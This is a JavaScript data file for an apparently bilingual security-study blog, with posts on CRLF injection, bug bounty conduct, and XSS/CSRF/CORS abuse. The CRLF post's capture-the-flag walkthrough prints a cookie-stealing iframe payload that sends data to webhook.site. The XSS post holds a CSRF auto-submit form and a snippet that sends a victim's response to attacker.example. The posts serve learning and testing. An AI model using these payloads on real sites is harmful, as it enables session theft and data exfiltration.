window.postsData = [
  {
    id: "crlf-injection",
    href: "posts/web/crlf-injection.html",
    title: {
      en: "CRLF Injection",
      zh: "CRLF 注入"
    },
    category: "web",
    categoryLabel: { en: "Web", zh: "Web" },
    description: {
      en: "CRLF injection basics, attack surfaces, bypass techniques, and a practical lab walkthrough.",
      zh: "CRLF 注入基础、常见攻击面、绕过方式与一篇带截图的实战记录。"
    },
    date: "2026-04-24",
    content: {
      en: "A full note covering the nature of CRLF injection, common abuse patterns, and a practical cookie exfiltration walkthrough.",
      zh: "完整梳理 CRLF 注入的本质、常见利用方式，以及一次获取管理员 Cookie 的实战过程。"
    },
    code: "%0D%0A%0D%0A",
    contentHtml: {
      en: String.raw`<p>CRLF (Carriage Return + Line Feed) is a control-character pair used to represent line breaks in network protocols:</p>
<ul>
  <li><code>\r</code>: Carriage Return</li>
  <li><code>\n</code>: Line Feed</li>
</ul>
<p>In HTTP, CRLF has <strong>structural meaning</strong>. It is not just ordinary text; it is used to:</p>
<ul>
  <li>Separate one header from another</li>
  <li>Separate headers from the response body</li>
</ul>
<blockquote>CRLF controls the structure of an HTTP message, not its content.</blockquote>
<hr />
<h3>The Nature of CRLF Injection</h3>
<p>The essence of a CRLF injection vulnerability is that an attacker can insert newline characters into an HTTP message, break the original structure, and forge new protocol-level content.</p>
<p>In other words:</p>
<ul>
  <li>Normal input is treated as data</li>
  <li>Injected CRLF is treated as protocol syntax</li>
</ul>
<p>That is the core reason the vulnerability exists.</p>
<hr />
<h3>A Basic Model</h3>
<p>Assume the server has logic like this:</p>
<pre><code>Location: /search?q=user_input</code></pre>
<p>If the user supplies:</p>
<pre><code>test\r\nSet-Cookie: session=hacked</code></pre>
<p>The server response becomes:</p>
<pre><code>Location: /search?q=test
Set-Cookie: session=hacked</code></pre>
<p>What happened here is:</p>
<ul>
  <li>The value was originally just a parameter</li>
  <li>It was elevated into a new header</li>
</ul>
<p>This is a classic CRLF injection.</p>
<hr />
<h3>Conditions for the Vulnerability</h3>
<ol>
  <li>User input reaches the structure of an HTTP message, such as a header, status line, or response</li>
  <li><code>\r</code> and <code>\n</code> are not filtered or encoded</li>
  <li>The backend directly concatenates strings</li>
</ol>
<blockquote>User-controlled input is inserted directly into protocol structure.</blockquote>
<hr />
<h3>Common Attack Types</h3>
<h4>Header Injection</h4>
<p>An attacker inserts new headers, for example:</p>
<ul>
  <li>Set-Cookie</li>
  <li>Location</li>
  <li>Content-Type</li>
</ul>
<p>This can lead to:</p>
<ul>
  <li>Cookie injection</li>
  <li>Session hijacking</li>
  <li>Manipulated redirects</li>
</ul>
<h4>HTTP Response Splitting</h4>
<p>By inserting:</p>
<pre><code>\r\n\r\n</code></pre>
<p>The attacker forcefully ends the current response and starts a new one:</p>
<pre><code>Normal response
\r\n\r\n
Forged response</code></pre>
<p>This can be used to:</p>
<ul>
  <li>Inject HTML pages</li>
  <li>Build XSS chains</li>
  <li>Return malicious content</li>
</ul>
<h4>Web Cache Poisoning</h4>
<ul>
  <li>Modify cached content through CRLF injection</li>
  <li>Poison CDN or proxy caches</li>
  <li>Make other users visit a malicious page</li>
  <li>Achieve persistent impact</li>
</ul>
<h4>Request Smuggling (Advanced Abuse)</h4>
<p>CRLF can also act as a low-level primitive for:</p>
<ul>
  <li>Injecting extra requests</li>
  <li>Confusing frontend and backend parsers</li>
  <li>Manipulating request queues</li>
</ul>
<p>These attacks are often combined with:</p>
<ul>
  <li>Differences between HTTP/1.1 and HTTP/2</li>
  <li>Inconsistent frontend/backend parsing behavior</li>
</ul>
<hr />
<h3>Common Injection Points</h3>
<p>CRLF injection is not limited to a single sink. Common entry points include:</p>
<ul>
  <li>URL parameters (GET)</li>
  <li>POST parameters</li>
  <li>HTTP headers such as <code>Referer</code> or <code>User-Agent</code></li>
  <li>Redirect parameters such as <code>Location</code></li>
  <li>Logging systems (log injection)</li>
</ul>
<hr />
<h3>Encoding and Bypass</h3>
<p>In practice, many systems try to filter <code>\r\n</code>, so bypass techniques are often needed.</p>
<h4>URL Encoding</h4>
<pre><code>%0d%0a
%0a
%0d</code></pre>
<h4>Double Encoding</h4>
<pre><code>%250d%250a</code></pre>
<h4>Variant Techniques</h4>
<ul>
  <li>Using only LF when a system filters only CR</li>
  <li>Abusing parsing differences between layers</li>
  <li>Using special HTTP/2 header constructions</li>
</ul>
<hr />
<h3>Relationship with XSS and CSRF</h3>
<p>CRLF itself is not always the final exploit. It is more like a primitive.</p>
<p>It can be used as:</p>
<ul>
  <li>A trigger for XSS by injecting HTML or JavaScript</li>
  <li>Support for CSRF by influencing headers or cookies</li>
  <li>A foundation for request smuggling</li>
</ul>
<blockquote>CRLF is control at the protocol layer, while XSS is control at the browser execution layer.</blockquote>
<hr />
<h3>Attack-Chain Perspective</h3>
<p>A full attack chain often looks like this:</p>
<pre><code>CRLF injection
→ Control HTTP structure
→ Insert malicious headers or response content
→ Trigger cache, browser, or backend behavior
→ Reach the final impact (XSS, privilege escalation, data exposure)</code></pre>
<hr />
<h3>Practical Walkthrough</h3>
<p>This was a site that allowed online reports. Clicking <code>REPORT</code> opened the report page. The objective was to obtain the administrator's cookie, which contained the flag.</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235305.png" alt="Target application landing page" />
<img src="assets/posts/crlf-injection/Pasted image 20260423220226.png" alt="Report page" />
<p>Enter some arbitrary content and then intercept the request with Burp Suite.</p>
<img class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png" alt="Burp Suite intercepted request" />
<p>The page only returned <code>reported</code>, without anything particularly interesting.</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235353.png" alt="Reported response page" />
<p>First, use CRLF injection in the <code>name</code> field to split the response with the following payload:</p>
<pre><code>%0D%0A%0D%0A</code></pre>
<p>This is equivalent to <code>\r\n\r\n</code>, and it does the following:</p>
<ul>
  <li>Ends the current header line</li>
  <li>Creates an additional blank line</li>
  <li>Forcefully terminates the response headers</li>
  <li>Pushes attacker-controlled content into the response body</li>
  <li>Makes the browser render subsequent content as HTML</li>
  <li>Allows the script inside <code>iframe srcdoc</code> to execute</li>
  <li>Triggers a request to the webhook after the script runs</li>
</ul>
<p>Next, use the following content in the <code>content</code> field:</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
let t = top.document.body.innerText || '';

let m = t.match(/Set-Cookie: flag=([^;\n]+)/);

(new Image()).src = 'https://webhook.site/?raw=' +
    encodeURIComponent(m[1]) +
    '&amp;dec=' +
    encodeURIComponent(atob(m[1]));
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>Because the response headers were terminated early through the <code>name</code> field, and that field was reflected into the header section on the target server, we could recover the cookie by matching it from the rendered page.</p>
<p>The payload can then be shortened into a single line:</p>
<pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>Finally, URL-encode the key characters:</p>
<pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
<img src="assets/posts/crlf-injection/Pasted image 20260423235453.png" alt="Final encoded payload" />
<p>The webhook then successfully received the request.</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235547.png" alt="Webhook request containing the flag" />`,
      zh: String.raw`<p>CRLF（Carriage Return + Line Feed）是一种在网络协议中用于表示换行的控制字符组合：</p>
<ul>
  <li><code>\r</code>：回车（Carriage Return）</li>
  <li><code>\n</code>：换行（Line Feed）</li>
</ul>
<p>在 HTTP 协议中，CRLF 具有<strong>结构性意义</strong>，它不是普通字符，而是用于：</p>
<ul>
  <li>分隔 Header 与 Header</li>
  <li>分隔 Header 与 Body</li>
</ul>
<blockquote>CRLF 控制的是 HTTP 报文的“结构”，而不是“内容”。</blockquote>
<hr />
<h3>CRLF 注入的本质</h3>
<p>CRLF 注入漏洞的本质是：攻击者可以向 HTTP 报文中插入换行符，从而“打断原有结构”，并“伪造新的协议内容”。</p>
<p>换句话说：</p>
<ul>
  <li>正常输入：被当成数据</li>
  <li>注入 CRLF：被当成协议</li>
</ul>
<p>这就是漏洞成立的核心。</p>
<hr />
<h3>一个基础模型</h3>
<p>假设服务器有如下逻辑：</p>
<pre><code>Location: /search?q=用户输入</code></pre>
<p>如果用户输入：</p>
<pre><code>test\r\nSet-Cookie: session=hacked</code></pre>
<p>服务器响应变成：</p>
<pre><code>Location: /search?q=test
Set-Cookie: session=hacked</code></pre>
<p>这里发生的事情是：</p>
<ul>
  <li>原本只是参数</li>
  <li>被提升为新的 Header</li>
</ul>
<p>这就是典型的 CRLF 注入。</p>
<hr />
<h3>漏洞形成条件</h3>
<ol>
  <li>用户输入进入 HTTP 报文结构中（Header / 状态行 / 响应）</li>
  <li>没有对 <code>\r</code> 和 <code>\n</code> 进行过滤或编码</li>
  <li>后端直接拼接字符串</li>
</ol>
<blockquote>用户输入被“直接拼进协议结构”。</blockquote>
<hr />
<h3>常见攻击类型</h3>
<h4>Header Injection</h4>
<p>攻击者插入新的 Header，例如：</p>
<ul>
  <li>Set-Cookie</li>
  <li>Location</li>
  <li>Content-Type</li>
</ul>
<p>效果包括：</p>
<ul>
  <li>注入 Cookie</li>
  <li>劫持会话</li>
  <li>控制重定向行为</li>
</ul>
<h4>HTTP Response Splitting</h4>
<p>通过插入如下内容：</p>
<pre><code>\r\n\r\n</code></pre>
<p>强行结束当前响应，开始一个新的响应：</p>
<pre><code>正常响应
\r\n\r\n
伪造响应</code></pre>
<p>攻击者可以：</p>
<ul>
  <li>注入 HTML 页面</li>
  <li>构造 XSS</li>
  <li>返回恶意内容</li>
</ul>
<h4>Web Cache Poisoning</h4>
<ul>
  <li>利用 CRLF 注入修改缓存内容</li>
  <li>污染 CDN 或代理缓存</li>
  <li>让其他用户访问恶意页面</li>
  <li>实现持久攻击</li>
</ul>
<h4>Request Smuggling（高阶利用）</h4>
<p>CRLF 可以作为基础构造：</p>
<ul>
  <li>插入额外请求</li>
  <li>干扰前后端解析</li>
  <li>操控请求队列</li>
</ul>
<p>这类攻击通常结合：</p>
<ul>
  <li>HTTP/1.1 与 HTTP/2 差异</li>
  <li>Front-end / Back-end 不一致解析</li>
</ul>
<hr />
<h3>常见注入位置</h3>
<p>CRLF 注入并不局限于某一个点，常见入口包括：</p>
<ul>
  <li>URL 参数（GET）</li>
  <li>POST 参数</li>
  <li>HTTP Header（如 Referer / User-Agent）</li>
  <li>重定向参数（Location）</li>
  <li>日志系统（Log Injection）</li>
</ul>
<hr />
<h3>编码与绕过</h3>
<p>现实中，很多系统会过滤 <code>\r\n</code>，因此需要绕过。常见方式包括：</p>
<h4>URL 编码</h4>
<pre><code>%0d%0a
%0a
%0d</code></pre>
<h4>双重编码</h4>
<pre><code>%250d%250a</code></pre>
<h4>变体利用</h4>
<ul>
  <li>只使用 LF（部分系统只过滤 CR）</li>
  <li>利用解析差异（前后端不同处理）</li>
  <li>HTTP/2 特殊 header 构造</li>
</ul>
<hr />
<h3>与 XSS / CSRF 的关系</h3>
<p>CRLF 本身不是最终攻击，而是一个“原语”。</p>
<p>它可以作为：</p>
<ul>
  <li>XSS 的触发器（注入 HTML / JS）</li>
  <li>CSRF 的辅助（控制 Header / Cookie）</li>
  <li>Smuggling 的基础</li>
</ul>
<blockquote>CRLF 是“协议层控制”，XSS 是“浏览器执行层控制”。</blockquote>
<hr />
<h3>攻击链视角</h3>
<p>完整攻击链通常是：</p>
<pre><code>CRLF 注入
→ 控制 HTTP 结构
→ 插入恶意 Header / Response
→ 触发缓存 / 浏览器 / 后端逻辑
→ 实现最终利用（XSS / 权限提升 / 数据泄露）</code></pre>
<hr />
<h3>实战表现</h3>
<p>这是一个可以在线举报的网站，点击 <code>REPORT</code> 会进入 report 页面。我们的目标是获得管理员的 Cookie，其中藏着 flag。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235305.png" alt="CRLF 注入靶场首页" />
<img src="assets/posts/crlf-injection/Pasted image 20260423220226.png" alt="进入 report 页面后的界面" />
<p>随便输入一些内容，然后使用 Burp Suite 拦截请求。</p>
<img class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png" alt="Burp Suite 拦截到的请求" />
<p>页面只返回 <code>reported</code>，没有特别的内容。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235353.png" alt="reported 响应页面" />
<p>首先，在 <code>name</code> 中利用 CRLF 注入进行分割，内容如下：</p>
<pre><code>%0D%0A%0D%0A</code></pre>
<p>它等价于 <code>\r\n\r\n</code>，作用是：</p>
<ul>
  <li>结束当前 header 行</li>
  <li>再制造一个空行</li>
  <li>强行结束响应头</li>
  <li>让后续可控内容进入 response body</li>
  <li>让浏览器把后续内容当作 HTML 渲染</li>
  <li>使 <code>iframe srcdoc</code> 里的脚本能够执行</li>
  <li>脚本执行后再请求 webhook</li>
</ul>
<p>其次是 <code>content</code> 中的内容：</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
let t = top.document.body.innerText || '';

let m = t.match(/Set-Cookie: flag=([^;\n]+)/);

(new Image()).src = 'https://webhook.site/?raw=' +
    encodeURIComponent(m[1]) +
    '&amp;dec=' +
    encodeURIComponent(atob(m[1]));
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>因为之前在 <code>name</code> 中提前结束了响应头，在目标服务器那边，<code>name</code> 被放进了 header 部分，所以我们可以利用匹配的方式来获取 Cookie。</p>
<p>将代码缩短为一行：</p>
<pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>再将关键字进行 URL 编码：</p>
<pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
<img src="assets/posts/crlf-injection/Pasted image 20260423235453.png" alt="编码后的最终 payload" />
<p>在 Webhook 成功收到请求。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235547.png" alt="Webhook 收到带有 flag 的请求" />`
    }
  },
  {
    id: "bug-bounty-programs",
    href: "posts/pentest/bug-bounty-programs.html",
    title: {
      en: "Bug Bounty Programs: Rules, Scope, and Report Writing",
      zh: "漏洞赏金计划：规则、范围与高质量报告"
    },
    category: "pentest",
    categoryLabel: { en: "Penetration Testing", zh: "渗透测试" },
    description: {
      en: "A practical study note on bug bounty program types, code of conduct, policy scope, CWE/CVSS, and reproducible reports.",
      zh: "系统整理漏洞赏金计划类型、行为准则、测试范围、CWE/CVSS 与可复现报告写作方法。"
    },
    date: "2026-05-07",
    content: {
      en: "Bug bounty programs are continuous security testing systems, not just a way to earn rewards.",
      zh: "漏洞赏金计划是一种持续安全测试机制，而不只是发现漏洞换奖金。"
    },
    code: "CWE + CVSS + clear reproduction steps",
    contentHtml: {
      en: String.raw`<p>A bug bounty program is a structured way for organizations to receive vulnerability reports from external researchers. Its value is not limited to paying rewards. A mature program turns outside testing into a continuous part of vulnerability management.</p>
<blockquote>VDP answers “how do I report this?” BBP answers “what incentive and rules apply when I report this?”</blockquote>
<hr />
<h3>Program Types</h3>
<ul>
  <li><strong>Private programs:</strong> invitation-only programs used to control report volume and mature the triage process.</li>
  <li><strong>Public programs:</strong> open to the wider research community and better for broad coverage.</li>
  <li><strong>Parent/child programs:</strong> shared bounty pool and shared security team across a group company structure.</li>
  <li><strong>VDP:</strong> a disclosure channel, often without monetary reward.</li>
  <li><strong>BBP:</strong> an active testing and reward model with defined scope, rules, and payout criteria.</li>
</ul>
<hr />
<h3>Before Testing</h3>
<p>The first skill in bug bounty is not payload writing. It is reading the policy. Most avoidable conflicts come from misunderstanding scope, test limits, or disclosure rules.</p>
<ul>
  <li>Confirm in-scope domains, APIs, mobile apps, IP ranges, and test accounts.</li>
  <li>Read out-of-scope exclusions before scanning or chaining impact.</li>
  <li>Check rules of engagement, rate limits, social engineering restrictions, and DoS restrictions.</li>
  <li>Understand safe harbor and legal terms.</li>
  <li>Know the response SLA and expected report format.</li>
</ul>
<hr />
<h3>High-Quality Report Structure</h3>
<ol>
  <li><strong>Title:</strong> name the vulnerability type, affected asset, and impact.</li>
  <li><strong>Summary:</strong> explain what is wrong in one short paragraph.</li>
  <li><strong>CWE:</strong> classify the weakness, preferably by root cause rather than final effect.</li>
  <li><strong>CVSS:</strong> describe severity with a standard metric, not only personal judgment.</li>
  <li><strong>Steps to reproduce:</strong> make the issue repeatable by a triager.</li>
  <li><strong>Impact:</strong> connect the technical issue to business risk.</li>
  <li><strong>Remediation:</strong> provide useful repair guidance when possible.</li>
</ol>
<hr />
<h3>CWE and CVSS</h3>
<p>CWE describes the weakness category. CVSS describes severity. For vulnerability chains, select the CWE that best represents the initial weakness, because that is usually what engineering must fix.</p>
<p>CVSS base scoring should consider attack vector, complexity, required privileges, user interaction, scope, and impact on confidentiality, integrity, and availability. The vulnerability name alone is never enough. A stored XSS in an admin-only panel and an unauthenticated remote code execution should not be scored the same way.</p>
<hr />
<h3>Learning Checklist</h3>
<ul>
  <li>Read policy before testing.</li>
  <li>Stay inside scope.</li>
  <li>Make reports reproducible.</li>
  <li>Explain impact in business language.</li>
  <li>Use CWE and CVSS to standardize communication.</li>
  <li>Keep professional conduct as important as technical skill.</li>
</ul>`,
      zh: String.raw`<p>漏洞赏金计划（Bug Bounty Program, BBP）本质上是一种<strong>持续、主动、可协作</strong>的安全测试机制。它不是开发结束后的附加检查，也不只是“找漏洞拿奖金”，而是把外部安全研究人员的能力纳入企业长期漏洞管理体系。</p>
<blockquote>VDP 解决“发现漏洞后怎么报告”，BBP 解决“在什么规则下测试、报告后如何激励”。</blockquote>
<hr />
<h3>漏洞赏金计划的类型</h3>
<ul>
  <li><strong>私有计划：</strong>只邀请特定研究人员参与，适合企业先控制报告量、磨合分诊流程。</li>
  <li><strong>公开计划：</strong>面向更广泛的安全社区，覆盖面更大，但对厂商响应和分诊能力要求更高。</li>
  <li><strong>母子计划：</strong>集团公司或多子公司共享奖金池、安全团队和统一处理流程。</li>
  <li><strong>VDP：</strong>漏洞披露计划，重点是提供合规报告通道，不一定有奖金。</li>
  <li><strong>BBP：</strong>漏洞赏金计划，明确测试范围、行为规则、奖励标准和报告要求。</li>
</ul>
<hr />
<h3>开始测试前必须读什么</h3>
<p>很多新手会直接冲向技术细节，但漏洞赏金里最先要掌握的是规则。范围、禁止行为、披露方式和法律条款，往往决定你最后是被确认、被降级，还是被判定为违规。</p>
<ul>
  <li><strong>Scope：</strong>哪些域名、API、App、IP 段、账号可以测试。</li>
  <li><strong>Out of Scope：</strong>哪些漏洞类型或资产明确不接受。</li>
  <li><strong>Rules of Engagement：</strong>是否允许自动化扫描、爆破、社工、DoS、数据访问。</li>
  <li><strong>Safe Harbor：</strong>在遵守规则时，平台或厂商给予研究人员的法律保护边界。</li>
  <li><strong>SLA：</strong>厂商确认、分诊、修复和奖励的大致时间线。</li>
  <li><strong>Reporting Format：</strong>报告需要包含哪些字段，以及附件、截图、PoC 的提交方式。</li>
</ul>
<blockquote>技术能力决定你能不能发现漏洞，规则意识决定你能不能长期做下去。</blockquote>
<hr />
<h3>一份好报告应包含什么</h3>
<ol>
  <li><strong>标题：</strong>直接写清漏洞类型、受影响位置和核心影响，例如“某接口越权导致任意用户邮箱可被修改”。</li>
  <li><strong>漏洞描述：</strong>说明问题为什么存在，尽量讲清根因，而不是只贴现象。</li>
  <li><strong>CWE：</strong>用标准弱点分类描述漏洞本质，例如访问控制缺失、输入验证不当、跨站脚本等。</li>
  <li><strong>CVSS：</strong>用标准化方式评估严重程度，避免只靠“我觉得很严重”。</li>
  <li><strong>复现步骤：</strong>让分诊人员可以一步一步稳定复现。步骤越清楚，确认越快。</li>
  <li><strong>影响分析：</strong>说明攻击者最终能做什么，会造成哪些业务风险。</li>
  <li><strong>修复建议：</strong>不是必须，但能体现专业度，也能缩短沟通成本。</li>
</ol>
<hr />
<h3>CWE 与 CVSS 的作用</h3>
<p><strong>CWE</strong> 回答的是“这是什么类型的弱点”。它让研究员、平台和工程团队用同一种语言交流根因。</p>
<p><strong>CVSS</strong> 回答的是“这个问题有多严重”。评分时需要看攻击向量、攻击复杂度、所需权限、是否需要用户交互、影响范围，以及对机密性、完整性、可用性的影响。</p>
<p>需要注意的是，漏洞名字不等于严重性。例如，同样叫 XSS，出现在无需登录的高流量页面和只影响管理员后台的低影响点，评分可能完全不同。面对漏洞链时，也应优先选择与<strong>初始漏洞</strong>相关的 CWE，而不是只看最终效果。</p>
<hr />
<h3>漏洞报告模板</h3>
<pre><code>Title: [漏洞类型] in [资产/功能] allows [影响]
Asset: https://example.com/path
CWE: CWE-xxx
CVSS: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N

Summary:
简短说明漏洞本质与最终影响。

Steps to Reproduce:
1. 登录测试账号。
2. 访问受影响功能。
3. 修改请求中的参数。
4. 观察未授权数据被读取或修改。

Impact:
攻击者可以在普通用户权限下访问其他用户敏感信息，造成数据泄露。

Remediation:
在服务端按当前登录用户进行对象级授权校验，不信任客户端传入的用户标识。</code></pre>
<hr />
<h3>学习要点</h3>
<ul>
  <li>不要把 BBP 和 VDP 混用。</li>
  <li>先读 Policy，再动手测试。</li>
  <li>报告要清晰、简洁、可复现。</li>
  <li>影响分析要从技术风险延伸到业务风险。</li>
  <li>CWE 用于分类，CVSS 用于定级。</li>
  <li>长期做漏洞赏金，专业性和技术能力同样重要。</li>
</ul>`
    }
  },
  {
    id: "advanced-xss-csrf",
    href: "posts/web/advanced-xss-csrf.html",
    title: {
      en: "Advanced XSS and CSRF Exploitation",
      zh: "高级 XSS 与 CSRF 利用"
    },
    category: "web",
    categoryLabel: { en: "Web", zh: "Web" },
    description: {
      en: "A learning note connecting XSS, CSRF, SOP, CORS, preflight requests, CORS misconfiguration, and CSRF-token bypass.",
      zh: "围绕 XSS、CSRF、同源策略、CORS、预检请求、CORS 错误配置与 CSRF Token 绕过的系统学习笔记。"
    },
    date: "2026-05-07",
    content: {
      en: "Modern browser security makes simple CSRF harder, but XSS and CORS mistakes can still create powerful attack chains.",
      zh: "现代浏览器安全机制让简单 CSRF 更难，但 XSS 与 CORS 错误配置仍能形成强力攻击链。"
    },
    code: "XSS -> authenticated browser action -> data access or CSRF bypass",
    contentHtml: {
      en: String.raw`<p>XSS and CSRF are often studied separately, but in real exploitation they frequently connect. XSS gives an attacker script execution in the victim browser. CSRF abuses the browser's authenticated state to perform actions. CORS misconfiguration can turn a cross-site request from “request sent but response blocked” into “request sent and response readable”.</p>
<hr />
<h3>XSS Basics</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260405051809.png" alt="XSS type overview" />
<ul>
  <li><strong>Stored XSS:</strong> payload is saved by the application and executed when other users view it.</li>
  <li><strong>Reflected XSS:</strong> payload is reflected in an immediate response.</li>
  <li><strong>DOM XSS:</strong> client-side JavaScript reads attacker-controlled data from a source and writes it into a dangerous sink.</li>
</ul>
<pre><code class="language-html">&lt;script&gt;alert(window.origin)&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
<p>For DOM XSS, focus on the data flow:</p>
<pre><code>attacker input -> source -> JavaScript processing -> sink -> browser execution</code></pre>
<hr />
<h3>CSRF in Modern Browsers</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043309.png" alt="CSRF vulnerable profile workflow" />
<p>SameSite cookies, SOP, CORS, and CSRF tokens make basic CSRF less reliable than it used to be. The important detail is that SOP usually prevents reading cross-origin responses, but it does not necessarily prevent the request itself from being sent. That gap is why state-changing requests still need CSRF protection.</p>
<pre><code class="language-html">&lt;form method="GET" action="https://target.example/profile.php"&gt;
  &lt;input type="hidden" name="promote" value="attacker" /&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
<hr />
<h3>SOP and CORS</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415054310.png" alt="Browser blocks cross-origin response access" />
<p>An origin is the combination of scheme, host, and port. If any of these differ, the two URLs are cross-origin. CORS is a controlled exception to SOP that lets a server decide which origins, methods, headers, and credentials are allowed.</p>
<ul>
  <li><code>Access-Control-Allow-Origin</code>: which origin may read the response.</li>
  <li><code>Access-Control-Allow-Credentials</code>: whether credentialed requests may be exposed to JavaScript.</li>
  <li><code>Access-Control-Allow-Methods</code>: methods allowed after preflight.</li>
  <li><code>Access-Control-Allow-Headers</code>: request headers allowed after preflight.</li>
  <li><code>Access-Control-Max-Age</code>: how long the preflight result is cached.</li>
</ul>
<hr />
<h3>Common CORS Misconfigurations</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415190236.png" alt="CORS origin reflection example" />
<ul>
  <li><strong>Arbitrary Origin Reflection:</strong> the server reflects any supplied <code>Origin</code>.</li>
  <li><strong>Weak Whitelist Matching:</strong> the server trusts unsafe suffix or prefix matches.</li>
  <li><strong>Trusted null Origin:</strong> the server allows <code>Access-Control-Allow-Origin: null</code>.</li>
  <li><strong>Internal Network Exposure:</strong> unauthenticated internal APIs use permissive CORS and become readable through a victim browser.</li>
</ul>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.example/data.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
  fetch('https://attacker.example/log', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({data: btoa(xhr.responseText)})
  });
};
xhr.send();</code></pre>
<hr />
<h3>Bypassing CSRF Tokens with CORS</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415190439.png" alt="CSRF token protected request" />
<p>If a target reflects the attacker's origin and allows credentials, JavaScript can first request a page that contains a CSRF token, read the token from the response, then submit the protected state-changing request with that valid token. This is why CORS mistakes can be more severe than classic CSRF.</p>
<blockquote>Normal CSRF can often send a request. CORS misconfiguration can let the attacker read the response and harvest dynamic tokens.</blockquote>`,
      zh: String.raw`<p>XSS、CSRF、同源策略和 CORS 不能孤立理解。现代浏览器已经限制了很多基础 CSRF 利用，但一旦存在 XSS 或 CORS 错误配置，攻击者就可能借助受害者浏览器的登录态，读取敏感响应、发起状态修改请求，甚至绕过 CSRF Token。</p>
<hr />
<h3>XSS 的核心概念</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260405051809.png" alt="XSS 类型概览" />
<p><strong>XSS（Cross-Site Scripting）</strong> 的本质是攻击者把恶意脚本注入页面，使浏览器在受害者上下文中执行攻击者代码。</p>
<ul>
  <li><strong>Stored XSS：</strong>输入被存储到后端数据库，其他用户查看时触发，危害通常最大。</li>
  <li><strong>Reflected XSS：</strong>输入被服务端处理后立即反射到响应中，不持久存储。</li>
  <li><strong>DOM XSS：</strong>用户可控数据被前端 JavaScript 读取，并写入危险 DOM Sink。</li>
</ul>
<pre><code class="language-html">&lt;script&gt;alert(window.origin)&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
<p>DOM XSS 可以按 Source 和 Sink 来分析：</p>
<ul>
  <li><strong>Source：</strong>用户可控数据进入前端脚本的位置，例如 <code>location.hash</code>、<code>document.URL</code>、<code>postMessage</code>。</li>
  <li><strong>Sink：</strong>数据最终落地的位置，例如 <code>innerHTML</code>、<code>document.write</code>、<code>eval</code>。</li>
</ul>
<pre><code>用户输入 -> Source 读取 -> JavaScript 处理 -> Sink 写入 DOM -> 浏览器解析执行</code></pre>
<hr />
<h3>CSRF 的现代利用思路</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043309.png" alt="CSRF 实验中的用户权限界面" />
<p><strong>CSRF（Cross-Site Request Forgery）</strong> 利用的是浏览器会自动携带目标站点凭证这一点。攻击者诱导受害者访问恶意页面，让受害者浏览器向目标站点发起已认证请求。</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043318.png" alt="提升权限请求示例" />
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://csrf.example/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="attacker" /&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>现代浏览器中的 SameSite Cookie、同源策略、CORS 和 CSRF Token 会限制基础 CSRF，但关键点是：<strong>同源策略通常阻止读取响应，不一定阻止请求发送</strong>。因此，只要目标接口能被跨站触发，状态修改仍然需要 CSRF 防护。</p>
<hr />
<h3>同源策略 SOP</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415054310.png" alt="同源策略拦截跨源响应读取" />
<p>Origin 由三部分组成：协议、域名、端口。只要其中任意一个不同，就不是同源。</p>
